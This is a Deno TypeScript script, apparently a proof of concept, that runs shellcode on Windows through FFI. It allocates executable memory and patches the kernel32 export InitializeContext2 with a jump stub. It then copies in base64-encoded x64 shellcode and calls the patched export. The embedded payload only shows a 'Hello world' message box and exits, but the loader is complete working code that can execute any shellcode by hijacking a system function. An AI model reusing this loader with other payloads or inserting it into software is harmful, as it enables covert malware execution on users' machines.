// deno.exe run --unstable --allow-ffi .\deno-windows-x64.ts
import { decode as base64decode } from 'https://deno.land/std/encoding/base64.ts'

function xxd(buf) {
	let line
	for (let i = 0; i < buf.length; i++) {
		if (i % 16 === 0) {
			line = i.toString(16).padStart(8, '0') + ':'
		}
		const b = buf[i]
		line += ' '
		line += buf[i].toString(16).padStart(2, '0')

		if (i % 16 === 15) {
			console.log(line)
			line = null
		}
	}

	if (line) {
		console.log(line)
	}
}

const {symbols: {
	GetModuleHandleA,
	GetProcAddress,
	RtlCopyMemory,
	VirtualAlloc,
	WriteProcessMemory,
	GetCurrentProcess,
	InitializeContext2: ShellcodeHolder,
}} = Deno.dlopen('kernel32.dll', {
	GetModuleHandleA: {
		parameters: ['buffer'],
		result: 'u64',
	},
	GetProcAddress: {
		parameters: ['u64', 'buffer'],
		result: 'u64',
	},
	RtlCopyMemory: {
		parameters: ['u64', 'buffer', 'usize'],
		result: 'u64',
	},
	VirtualAlloc: {
		parameters: ['u64', 'usize', 'u32', 'u32'],
		result: 'u64',
	},
	WriteProcessMemory: {
		parameters: ['u64', 'u64', 'buffer', 'usize', 'buffer'],
		result: 'u32',
	},
	GetCurrentProcess: {
		parameters: [],
		result: 'u64',
	},
	InitializeContext2: {
		parameters: [],
		result: 'void',
	},
})

let encoder = new TextEncoder()
const kernel32 = GetModuleHandleA(encoder.encode('kernel32\0'))
console.log(`kernel32: ${kernel32.toString(16)}`)
const shellcodeHolderPtr = GetProcAddress(kernel32, encoder.encode('InitializeContext2\0'))
console.log(`InitializeContext2: ${shellcodeHolderPtr.toString(16)}`)


const sc_mem = new Deno.UnsafePointerView(VirtualAlloc(0, 1024*4, 0x3000, 0x40))
console.log(`sc_mem.pointer: ${sc_mem.pointer.toString(16)}`)

const shellcodeArr = new Uint8Array(sc_mem.getArrayBuffer(1024*4))

const stubBuf = new ArrayBuffer(64)
const stubPtr = new BigUint64Array(stubBuf, 0, 3)
stubPtr[0] = 0xb848cccccccc04ebn
stubPtr[1] = BigInt(sc_mem.pointer)
stubPtr[2] = 0xcccccccccccce0ffn

WriteProcessMemory(GetCurrentProcess(), BigInt(shellcodeHolderPtr), stubPtr, 24, new Uint8Array(stubBuf, 24))

const sc = base64decode('SIPsKEiD5PBIjRVmAAAASI0NUgAAAOieAAAATIv4SI0NXQAAAP/QSI0VXwAAAEiNDU0AAADofwAAAE0zyUyNBWEAAABIjRVOAAAASDPJ/9BIjRVWAAAASI0NCgAAAOhWAAAASDPJ/9BLRVJORUwzMi5ETEwATG9hZExpYnJhcnlBAFVTRVIzMi5ETEwATWVzc2FnZUJveEEASGVsbG8gd29ybGQATWVzc2FnZQBFeGl0UHJvY2VzcwBIg+woZUyLBCVgAAAATYtAGE2NYBBNiwQk/EmLeGBIi/GshMB0JoongPxhfAOA7CA64HUISP/HSP/H6+VNiwBNO8R11kgzwOmnAAAASYtYMESLSzxMA8tJgcGIAAAARYspTYXtdQhIM8DphQAAAE6NBCtFi3EETQP1QYtIGEWLUCBMA9P/yU2NDIpBizlIA/tIi/KmdQiKBoTAdAnr9eLmSDPA605Fi0gkTAPLZkGLDElFi0gcTAPLQYsEiUk7xXwvSTvGcypIjTQYSI18JDBMi+ekgD4udfqkxwdETEwASYvMQf/XSYvMSIvW6RT///9IA8NIg8Qoww==')
shellcodeArr.set(sc)
xxd(sc)

ShellcodeHolder()
